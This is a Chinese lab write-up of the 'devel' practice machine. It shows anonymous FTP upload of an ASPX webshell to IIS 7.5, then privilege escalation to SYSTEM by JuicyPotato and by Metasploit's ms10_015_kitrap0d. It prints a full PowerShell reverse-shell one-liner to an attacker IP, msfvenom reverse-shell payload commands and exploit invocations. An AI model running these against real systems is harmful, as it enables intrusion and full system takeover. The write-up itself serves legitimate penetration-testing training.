---
title: 【微信】从ftp文件上传到.net getshell，从烂土豆提权到msf框架提权比较靶机练习之devel
source: https://mp.weixin.qq.com/s/ammUyYByRxKcw7CsqxNgiQ
source_host: mp.weixin.qq.com
clip_date: 2026-10-31T14:53:24+08:00
trace_id: 179d86d8-cfe1-4958-8162-175803342a9a
content_hash: ca6c802d92c2009b674397db9773efa5be94523d68544e26383a53bc6cc13908
status: synced
tags:
  - 微信
  - CTF
  - 权限提升
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: "**TL;DR：** 通过匿名 FTP 上传 ASPX webshell 攻破 IIS 7.5 靶机，再分别用 JuicyPotato 和 MSF 内核漏洞两条路径完成 SYSTEM 提权。"
ai_summary_style: key-points
images_status:
  total: 27
  succeeded: 27
  failed_urls: []
notion_page_id: 40a75244-d011-81cf-9d5b-c66a6f75367c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** 通过匿名 FTP 上传 ASPX webshell 攻破 IIS 7.5 靶机，再分别用 JuicyPotato 和 MSF 内核漏洞两条路径完成 SYSTEM 提权。
> 
> - **信息搜集：** nmap 全端口扫描发现 21/FTP 与 80/HTTP 两个服务；FTP 支持匿名登录，Web 端为 IIS 7.5 + .NET 框架，默认站点位于 `C:\inetpub\wwwroot`。
> - **Getshell：** 先用 `put 1.txt` 验证 FTP 可写，随后把 Kali 自带的 `cmdasp.aspx` 上传到站点目录，访问即获得命令执行，再借 PowerShell 一行脚本（`Net.Sockets.TCPClient`）反弹回交互 shell。
> - **JuicyPotato 提权：** `whoami /all` 显示拥有 SeImpersonatePrivilege，满足 Potato 类利用前提（诱使 SYSTEM 向假冒 RPC 端点做 NTLM 认证并模拟其令牌）；用 msfvenom 生成 x86 反弹 exe，FTP 必须切 `binary` 模式上传（ASCII 模式会转换换行符破坏二进制），配 Windows 7 CLSID `{F087771F-...}` 成功以 SYSTEM 执行。
> - **MSF 提权：** 改用 `meterpreter/reverse_tcp` 马落地后，`local_exploit_suggester` 自动枚举可用的本地提权模块，命中 `ms10_015_kitrap0d` 内核漏洞，同样成功拿到 SYSTEM，与 Potato 方案形成对比。

**百炼G33K** *2026年10月31日 14:24*

## 信息搜集

### 端口扫描

```
nmap -sT --min-rate 10000 10.129.63.81 -p-
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/aba862e17c24dc6f.png)

### 版本信息探测

```
nmap -sT -sC -sV 10.129.63.81 -p21,80 -o ports
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c28575ddc71837a6.png)

> 开了一个21ftp文件上传和80web服务 ftp可以匿名登录

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a8f3261c579a6f70.png)

> 80是个iis7服务,继续探测一下web框架

```
curl --head http://10.129.63.81/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fd97f80dbef7effc.png)

> iis7.5,.net web框架

## ftp渗透

```
ftp anonymous@10.129.63.81
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/34b2afcb55ade1e7.png)

> 先测试一下上传功能

```
put 1.txt
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bfe069bdafa0ea61.png)

> 成功上传 下面准备上传webshell

```
locate webshell aspx
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/66eb62268604725f.png)

```
 cp /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
```

> 直接利用kali自带的webshell

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/02013326230035e0.png)

```
put cmdaspx.aspx
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0d14a27884672ee0.png)

> 成功上传

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6bec986db40b661b.png)

> 拿到命令执行权限

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6bec986db40b661b.png)

## 提权

> 先反弹shell

```powershell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.10.15.182',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ef3ca1bf84815888.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d265b582c0cefb92.png)

> 看一下系统信息

```
systeminfo
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a29fd80a0a006e70.png)

> 是下x86 位的 看一下用户信息

```
whoami /all
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/11f53d8fda2c5107.png)

> 存在SeImpersonatePrivilege滥用，可以考虑potato提权

### juicypotato提权

```
Potato 提权原理的过程如下：
- 诱使“NT AUTHORITY\SYSTEM”账户通过 NTLM 向我们掌控的 TCP 端点进行身份验证（向我们假冒的 RPC 服务器进行身份验证）。
- 对此次身份验证尝试（NTLM 中继）实施中间人攻击，从而在本地为“NT AUTHORITY\SYSTEM”账户协商安全令牌。这是借助一系列 Windows API 调用（与 LSASS 进行交互）来实现的。
- 鉴于该账户拥有 SeImpersonatePrivilege 特权，然后就可以模拟我们刚刚协商的 SYSTEM 令牌。 
```

> github先找一下juicypotato x86的

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ee1e1a1d4b4e20f4.png)

> 然后再找一个system权限执行的程序，这里我直接制作一个反弹shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.129.64.45 LPORT=5555 -a x86 -f exe -o shell.exe
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8d30660091ff8ff6.png)

> ftp切换到二进制模式,FTP 的 **ASCII 模式** 会在传输时转换换行符，破坏二进制文件的原始结构。

```
binary
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/14cf44c77964241a.png)

> 上传到靶机

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2bf6f902d7580620.png)

> windows机器的iis服务一般是运行在，C:\\inetpub\\wwwroot 目录

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4a8c37fb7755142e.png)

> 这边也是找到了落地的上传文件，先测试一下能否提权

> 参考一下windows7 clsid

```
https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7cd98ba0c6531e27.png)

```
./juicypotato_x86.exe -t * -p ./shell.exe -l 443 -c "{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}"
```

> 成功提权

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f687032d682d6395.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/55fed04bcc246d53.png)

### msf提权

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.182 LPORT=5555  -a x86 -f exe -o msf.exe
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/439095cb3b3706de.png)

> **local_exploit_suggester** 利用提权模块

```
getuid
background
search suggester
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/04073467b4f77332.png)

```
set session 1
run
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/629ae54e0ba22ab0.png)

> 用内核提权漏洞ms10_015_kitrap0d

```
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set lhost xxxx
set lport 7777
run
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3497bdae619c1563.png)

> 也是成功提权

靶机记录 · 目录
